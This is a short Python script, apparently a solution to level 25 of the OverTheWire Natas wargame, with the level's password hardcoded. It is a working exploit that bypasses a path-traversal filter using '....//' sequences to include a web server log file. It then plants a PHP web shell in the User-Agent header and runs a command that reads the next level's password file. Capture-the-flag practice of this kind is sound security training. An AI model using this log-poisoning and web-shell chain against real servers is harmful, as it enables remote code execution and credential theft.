# Code execution via User Agent Header

import re
import requests
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas25'
password = 'O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx'

# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'

# Create a session and set the authorization credentials
session = requests.Session()

# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)


# Simple request to grab the PHPSESSID
session.get(url)
sessionID = session.cookies['PHPSESSID']

params = {"lang": f"....//....//....//....//....//var/www/natas/natas25/logs/natas25_{sessionID}.log", "cmd": "cat /etc/natas_webpass/natas26"}

headers = {"User-Agent": "<?php system($_GET['cmd']); ?>"}

# GET request with payload
resp = session.get(url, params=params, headers=headers)


print(f"Natas 26: {re.search('] (.*)', resp.text).group(1)}")
